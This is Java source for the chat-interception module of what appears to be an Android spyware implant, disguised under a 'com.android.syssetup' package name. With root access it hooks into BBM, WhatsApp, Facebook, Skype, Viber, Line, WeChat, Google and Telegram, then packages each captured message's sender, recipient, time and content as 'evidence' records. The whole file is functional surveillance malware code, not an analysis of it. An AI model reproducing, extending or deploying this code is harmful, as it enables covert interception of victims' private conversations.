package com.android.syssetup.module;

import com.android.syssetup.ProcessInfo;
import com.android.syssetup.Status;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfModule;
import com.android.syssetup.evidence.EvidenceBuilder;
import com.android.syssetup.evidence.EvidenceType;
import com.android.syssetup.interfaces.Observer;
import com.android.syssetup.listener.ListenerProcess;
import com.android.syssetup.module.chat.ChatBBM;
import com.android.syssetup.module.chat.ChatFacebook;
import com.android.syssetup.module.chat.ChatGoogle;
import com.android.syssetup.module.chat.ChatLine;
import com.android.syssetup.module.chat.ChatSkype;
import com.android.syssetup.module.chat.ChatTelegram;
import com.android.syssetup.module.chat.ChatViber;
import com.android.syssetup.module.chat.ChatWeChat;
import com.android.syssetup.module.chat.ChatWhatsapp;
import com.android.syssetup.module.chat.MessageChat;
import com.android.syssetup.util.ByteArray;
import com.android.syssetup.util.Check;
import com.android.syssetup.util.DateTime;
import com.android.syssetup.util.WChar;

import java.util.ArrayList;


public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {

	private static final String TAG = "ModuleChat";

	SubModuleManager subModuleManager;

	public ModuleChat() {
		subModuleManager = new SubModuleManager(this);

		if (Cfg.ENABLE_EXPERIMENTAL_MODULES) {
			subModuleManager.add(new ChatTelegram());

		} else {
			subModuleManager.add(new ChatBBM());
			subModuleManager.add(new ChatFacebook());
			subModuleManager.add(new ChatWhatsapp());
			subModuleManager.add(new ChatSkype());
			subModuleManager.add(new ChatViber());
			subModuleManager.add(new ChatLine());
			subModuleManager.add(new ChatWeChat());
			subModuleManager.add(new ChatGoogle());
			subModuleManager.add(new ChatTelegram());
		}
	}

	@Override
	protected boolean parse(ConfModule conf) {
		if (Status.self().haveRoot()) {

			setDelay(SOON);
			setPeriod(NEVER);
			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse), don't have root, bailing out");
			}
			return false;
		}
	}

	@Override
	protected void actualGo() {
		subModuleManager.go();
	}

	@Override
	protected void actualStart() {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}

		ListenerProcess.self().attach(this);
		subModuleManager.start();
	}

	@Override
	protected void actualStop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStop)");
		}
		subModuleManager.stop();
		ListenerProcess.self().detach(this);
	}

	public void saveEvidence(ArrayList<MessageChat> messages) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence)");
		}

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		for (MessageChat message : messages) {
			DateTime datetime = new DateTime(message.timestamp);

			// TIMESTAMP
			items.add(datetime.getStructTm());
			// PROGRAM_TYPE
			items.add(ByteArray.intToByteArray(message.programId));
			// FLAGS
			int incoming = message.incoming ? 0x01 : 0x00;
			items.add(ByteArray.intToByteArray(incoming));
			// FROM
			items.add(WChar.getBytes(message.from, true));
			// FROM DISPLAY
			items.add(WChar.getBytes(message.displayFrom, true));
			// TO
			items.add(WChar.getBytes(message.to, true));
			// TO DISPLAY
			items.add(WChar.getBytes(message.displayTo, true));
			// CONTENT
			items.add(WChar.getBytes(message.body, true));
			items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));

			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveEvidence): " + datetime.toString() + " " + message.from + " -> " + message.to
						+ " : " + message.body);
			}
		}

		EvidenceBuilder.atomic(EvidenceType.CHATNEW, items);
	}

	@Override
	public int notification(ProcessInfo process) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification), ");
		}
		return subModuleManager.notification(process);
	}

}
